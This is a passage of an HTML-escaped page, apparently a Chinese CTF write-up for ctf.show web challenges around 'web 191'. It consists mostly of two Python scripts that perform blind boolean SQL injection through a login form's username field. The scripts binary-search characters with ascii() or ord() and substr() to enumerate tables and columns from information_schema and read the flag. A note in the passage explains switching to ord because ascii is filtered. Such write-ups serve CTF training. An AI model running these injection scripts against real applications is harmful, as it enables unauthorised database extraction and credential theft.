string&#34;&gt;&#34;1&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;str_set &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; string&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ascii_letters &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; string&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;digits &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; string&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;punctuation &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://4cd908a0-fce3-4625-81ad-18085f85af6e.challenge.ctf.show/api/&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;index &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    left &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    right &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; left &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; right&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;left &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; right&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_fl0g&#39;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;select group_concat(f1ag) from ctfshow_fl0g&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string&#34;&gt;&#34;username&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;admin&#39; and if(ascii(substr((&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;,1)) &amp;gt; &lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;,1,2) =&#39;1&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string&#34;&gt;&#34;password&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# print(data)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        res &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;密码错误&#34;&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;json&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            left &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            right &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    result &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;left&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;result:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;result&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    index &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;web-191&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-191&#34;&gt;#&lt;/a&gt; web 191&lt;/h1&gt;
&lt;p&gt;过滤了 &lt;code&gt;ascii&lt;/code&gt; ，使用 &lt;code&gt;ord&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Author       : dpm12345 1006975692@qq.com&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Github       : https://github.com/dpm12345&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Date         : 2023-07-15 17:17:55&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LastEditors  : dpm12345 1006975692@qq.com&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LastEditTime : 2023-07-15 18:05:57&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Description  : &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&#39;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; string&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pwd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;1&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;str_set &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; string&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ascii_letters &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; string&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;digits &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; string&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;punctuation &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://d6c927bd-730c-4a1c-a8d0-de2deaca515b.challenge.ctf.show/api/&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;index &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    left &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    right &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; left &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; right&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;left &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; right&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# payload = &#34;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_fl0g&#39;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;select group_concat(f1ag) from ctfshow_fl0g&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string&#34;&gt;&#34;username&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;admin&#39; and if(ord(substr((&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;,1)) &amp;gt; &lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;,1,2) =&#39;1&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string&#34;&gt;&#34;password&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# print(data)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        res &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;密码错误&#34;&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;json&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            left &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            right &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    result &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;left&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;result:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;result&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    index &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;web-195&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-195&#34;&gt;#&lt;/a&gt; web 195&lt;/h1&gt;
